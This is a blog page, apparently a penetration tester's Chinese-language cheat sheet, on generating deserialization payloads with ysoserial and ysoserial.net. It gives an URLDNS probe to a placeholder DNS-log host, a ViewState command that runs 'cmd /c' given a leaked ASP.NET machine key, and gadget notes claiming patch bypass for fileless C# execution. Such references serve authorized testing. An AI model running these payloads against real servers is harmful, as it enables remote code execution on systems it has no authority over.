@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Yso | h4xk0r blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="JAVA_YSO
+基础命令格式
+java -jar ysoserial.jar [利用链] [执行的命令]
+
+利用链: CommonsCollections1, URLDNS, Jackson 等
+探测/检测
+如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS
+java -jar ysoserial.jar URLDNS &#34;http://your-dnslog-url.com&#34;
+注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c
+.net_yso
+基础命令
+ysoserial.exe -g [Gadget] -f [Formatter] -c &#34;[Command]&#34; -o 编码
+
+-g  利用链的名称,如TextFormattingRunProperties
+-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
+-c  执行的命令
+-o  编码处理,如 raw ,bash64, urlencode
+利用  (web Machinekey泄露)
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34; --validationkey=&#34;你的KEY&#34; --validationalg=&#34;SHA1&#34;
+技巧
+- p 参数可以指定插件,对一些特定目标进行测试
+-p ViewState：处理 ASP.NET ViewState。
+-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
+利用链:">
+<meta name="author" content="h4xk0r">
+<link rel="canonical" href="http://localhost:1313/nodes/yso/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.314abab0bce79c9458c3bcc909ca5440767e8fa2822428ed33ce608ca6f66fa0.css" integrity="sha256-MUq6sLznnJRYw7zJCcpUQHZ&#43;j6KCJCjtM85gjKb2b6A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/nodes/yso/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="档案">
+                    <span>档案</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/fuzzlist/" title="Fuzzlist">
+                    <span>Fuzzlist</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Yso
+    </h1>
+    <div class="post-meta"><span title='2026-04-10 23:50:39 +0800 CST'>April 10, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#java_yso" aria-label="JAVA_YSO">JAVA_YSO</a><ul>
+                        <ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#%e5%9f%ba%e7%a1%80%e5%91%bd%e4%bb%a4%e6%a0%bc%e5%bc%8f" aria-label="基础命令格式">基础命令格式</a></li>
+                <li>
+                    <a href="#%e6%8e%a2%e6%b5%8b%e6%a3%80%e6%b5%8b" aria-label="探测/检测">探测/检测</a></li></ul>
+                    </ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#net_yso" aria-label=".net_yso">.net_yso</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="java_yso">JAVA_YSO<a hidden class="anchor" aria-hidden="true" href="#java_yso">#</a></h2>
+<h5 id="基础命令格式">基础命令格式<a hidden class="anchor" aria-hidden="true" href="#基础命令格式">#</a></h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar ysoserial.jar <span style="color:#f92672">[</span>利用链<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>执行的命令<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>利用链: CommonsCollections1, URLDNS, Jackson 等
+</span></span></code></pre></div><h5 id="探测检测">探测/检测<a hidden class="anchor" aria-hidden="true" href="#探测检测">#</a></h5>
+<p>如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用<code>URLDNS</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar ysoserial.jar URLDNS <span style="color:#e6db74">&#34;http://your-dnslog-url.com&#34;</span>
+</span></span></code></pre></div><p>注: 如果执行复杂命令最好封装成脚本执行,或者使用<code>sh -c</code>/<code>bash -c</code></p>
+<h2 id="net_yso">.net_yso<a hidden class="anchor" aria-hidden="true" href="#net_yso">#</a></h2>
+<p>基础命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ysoserial.exe -g <span style="color:#f92672">[</span>Gadget<span style="color:#f92672">]</span> -f <span style="color:#f92672">[</span>Formatter<span style="color:#f92672">]</span> -c <span style="color:#e6db74">&#34;[Command]&#34;</span> -o 编码
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-g  利用链的名称,如TextFormattingRunProperties
+</span></span><span style="display:flex;"><span>-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
+</span></span><span style="display:flex;"><span>-c  执行的命令
+</span></span><span style="display:flex;"><span>-o  编码处理,如 raw ,bash64, urlencode
+</span></span></code></pre></div><p>利用  (web Machinekey泄露)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span style="color:#e6db74">&#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34;</span> --validationkey<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;你的KEY&#34;</span> --validationalg<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SHA1&#34;</span>
+</span></span></code></pre></div><p>技巧</p>
+<p><code>- p</code> 参数可以指定插件,对一些特定目标进行测试</p>
+<pre tabindex="0"><code>-p ViewState：处理 ASP.NET ViewState。
+-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
+</code></pre><p>利用链:</p>
+<pre tabindex="0"><code>场景/格式,            				推荐 Gadget,										说明
+BinaryFormatter				TextFormattingRunProperties					通用性最强，成功率高
+Json.NET					  ObjectDataProvider					   针对特定配置的 JSON 解析
+XamlReader,					    ExpandedWrapper					   	   常用于 WPF 或特定 XML 处理
+通用（高版本）				   ActivitySurrogateSelector				  配合插件可执行任意 C# 代码
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer><div id="utterances-container"></div>
+
+<script>
+    
+    function isDarkMode() {
+        const html = document.documentElement;
+        const body = document.body;
+
+        
+        if (html.getAttribute("data-theme") === "dark" || html.classList.contains("dark") ||
+            body.getAttribute("data-theme") === "dark" || body.classList.contains("dark")) {
+            return true;
+        }
+        
+        if (html.getAttribute("data-theme") === "light" || html.classList.contains("light") ||
+            body.getAttribute("data-theme") === "light" || body.classList.contains("light")) {
+            return false;
+        }
+        
+        const prefTheme = localStorage.getItem("pref-theme");
+        if (prefTheme) {
+            return prefTheme === "dark";
+        }
+        
+        return window.matchMedia('(prefers-color-scheme: dark)').matches;
+    }
+
+    function getTargetTheme() {
+        return isDarkMode() ? "github-dark" : "github-light";
+    }
+
+    function loadUtterances() {
+        const container = document.getElementById("utterances-container");
+        if (!container || container.hasChildNodes()) return;
+
+        const script = document.createElement("script");
+        script.src = "https://utteranc.es/client.js";
+        script.setAttribute("repo", "h4xk0r/h4xk0r.github.io"); 
+        script.setAttribute("issue-term", "pathname");
+        script.setAttribute("label", "comment");
+        script.setAttribute("theme", getTargetTheme());
+        script.setAttribute("crossorigin", "anonymous");
+        script.async = true;
+
+        container.appendChild(script);
+    }
+
+    function syncUtterancesTheme() {
+        const iframe = document.querySelector("iframe.utterances-frame");
+        if (iframe && iframe.contentWindow) {
+            iframe.contentWindow.postMessage({
+                type: 'set-theme',
+                theme: getTargetTheme()
+            }, 'https://utteranc.es');
+        }
+    }
+
+    
+    if (document.readyState === "interactive" || document.readyState === "complete") {
+        loadUtterances();
+    } else {
+        document.addEventListener("DOMContentLoaded", loadUtterances);
+    }
+
+    
+    const observer = new MutationObserver((mutations) => {
+        for (const mutation of mutations) {
+            if (mutation.attributeName === "class" || mutation.attributeName === "data-theme") {
+                syncUtterancesTheme();
+                break; 
+            }
+        }
+    });
+
+    
+    observer.observe(document.documentElement, { attributes: true, attributeFilter: ["class", "data-theme"] });
+    observer.observe(document.body, { attributes: true, attributeFilter: ["class", "data-theme"] });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">h4xk0r blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            const id = this.getAttribute("href").substr(1);
+            if (!id) return;
+
+            
+            
+            const nextUl = this.nextElementSibling;
+            if (this.closest('.toc') && nextUl && nextUl.tagName === 'UL') {
+                const rect = this.getBoundingClientRect();
+                const offsetX = e.clientX - rect.left;
+
+                
+                if (offsetX < 45) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isVisible = window.getComputedStyle(nextUl).display !== 'none';
+                    nextUl.style.display = isVisible ? 'none' : 'block';
+                    this.parentElement.classList.toggle('is-expanded');
+                    
+                    return false; 
+                }
+            }
+
+            
+            
+            e.preventDefault();
+            const targetElement = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+            if (targetElement) {
+                if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                    targetElement.scrollIntoView({ behavior: "smooth" });
+                } else {
+                    targetElement.scrollIntoView();
+                }
+                
+                if (id === "top") {
+                    history.replaceState(null, null, " ");
+                } else {
+                    history.pushState(null, null, `#${id}`);
+                }
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script></body>
+
+</html>
